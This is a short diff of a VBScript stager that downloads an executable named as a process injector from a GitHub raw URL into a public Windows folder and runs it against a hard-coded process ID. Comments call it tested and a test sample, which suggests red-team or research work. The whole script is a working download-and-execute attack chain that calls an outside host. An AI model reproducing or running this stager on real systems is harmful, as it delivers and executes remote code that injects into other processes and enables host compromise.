@@ -7,7 +7,7 @@
 ' ===================================
 ' Download Clause
 ' Tested with binaries - works!
-HTTPDownload "https://github.com/dtrizna/.NET_inject/raw/master/inject_252_114_x64.exe", "C:\Users\Public\Downloads\"
+HTTPDownload "https://raw.githubusercontent.com/dtrizna/dotNETinject/master/donutTest_inject_252_114_x64.exe", "C:\Users\Public\Downloads\"
 
 Sub HTTPDownload( myURL, myPath )
 
@@ -54,7 +54,9 @@ End Sub
 
 Dim sh  
 Set sh = CreateObject("Wscript.Shell")  
-Call sh.Run("C:\Users\Public\Downloads\inject_252_114_x64.exe 7804")  
+' Test sample
+' Aparently you need to specify valid PID manually here:
+Call sh.Run("C:\Users\Public\Downloads\donutTest_inject_252_114_x64.exe 7804")  
 Set sh = Nothing  
 WScript.Quit()
     
